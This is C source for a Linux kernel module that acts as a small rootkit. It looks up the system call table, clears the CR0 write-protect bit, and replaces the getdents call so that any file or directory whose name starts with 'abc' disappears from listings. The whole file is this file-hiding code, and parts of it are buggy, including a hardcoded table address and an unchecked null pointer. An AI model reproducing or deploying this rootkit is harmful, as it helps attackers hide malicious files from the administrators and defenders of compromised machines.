#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
//#include<syscall_table_32.S>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/special_insns.h>
#include <linux/uaccess.h>

#define PREFIX "abc"
#define PREFIX_SIZE (sizeof(PREFIX) - 1)

struct dirent_{
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

static unsigned long **p_sys_call_table;
/* Aquire system calls table address */
unsigned long original_cr0;

#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

MODULE_LICENSE("GPL");

unsigned long *syscall_table = (void *)0xffffffff81e001a0;

asmlinkage int (*original_getdents) (unsigned int, struct dirent_  *, unsigned int);

asmlinkage int custom_getdents(unsigned int fd, struct dirent_  *entries, unsigned int count) {
	
	char check[5] = "abc";
	struct dirent_ *dEntryPtr;
	//dEntryPtr = entries;
	long bytes_read;

	//printk(KERN_ALERT "Count before: %d\n", count);
	bytes_read = original_getdents(fd, entries, count);

	if(bytes_read <= 0) {
		return 0;
	}
        	
	//printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
	char* dbuf;
	dbuf = (char*) entries;
	int boff=0;
	
	//printk(KERN_ALERT "%ld %ld %ld\n", (unsigned long) dbuf, (unsigned long)(dbuf + bytes_read), bytes_read);
	

	// read all loop
	for(boff = 0; boff < bytes_read;){
		dEntryPtr = (struct dirent_*) (dbuf + boff);
		if(strlen(dEntryPtr->d_name) >=3 && dEntryPtr->d_name[0]=='a' && dEntryPtr->d_name[1]=='b' && dEntryPtr->d_name[2] == 'c'){
			copy_to_user(dbuf + boff, dbuf + boff + dEntryPtr -> d_reclen, bytes_read - (boff + dEntryPtr -> d_reclen));
			bytes_read -= dEntryPtr->d_reclen;
		}
		else {
			boff += dEntryPtr->d_reclen;
		}
		
	}

	return bytes_read;	
}


int make_rw(unsigned long *address) {
	printk(KERN_ALERT "Ho ho\n");
	unsigned int level;
	pte_t *pte;
	printk(KERN_ALERT "Inside make_rw\n");
	printk(KERN_ALERT "Address %p\n", (void *) address);
	pte = lookup_address(*address, &level);
	if(NULL == pte) {
		printk(KERN_ALERT "Why is Pte null?\n");
	}
	printk(KERN_ALERT "Before\n"); 
	if(pte -> pte &~ _PAGE_RW) {
		printk(KERN_ALERT "Inside the if\n");
		pte -> pte |= _PAGE_RW;
	}
	printk(KERN_ALERT "Came out\n"); 
	return 0;

}

/* Make the page write protected */ 
int make_ro(unsigned long *address) {
	unsigned int level;
	pte_t *pte;
	printk(KERN_ALERT "Inside make_ro\n");
	pte = lookup_address(*address, &level); 
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}


__init int init_module(void)
{


    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
 
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
    //Get the number from /usr/include/asm/unistd_64.h
    original_getdents = (void *)p_sys_call_table[__NR_getdents];

    // we now overwrite the syscall
    p_sys_call_table[__NR_getdents] = (unsigned long *) custom_getdents;
    write_cr0(original_cr0);
    
    return 0;
}

void cleanup_module(void)
{
   // Restore the original call

   if (p_sys_call_table != NULL) {
   	original_cr0 = read_cr0();
    	write_cr0(original_cr0 & ~0x00010000);

    	p_sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;

    	write_cr0(original_cr0);
   }
}

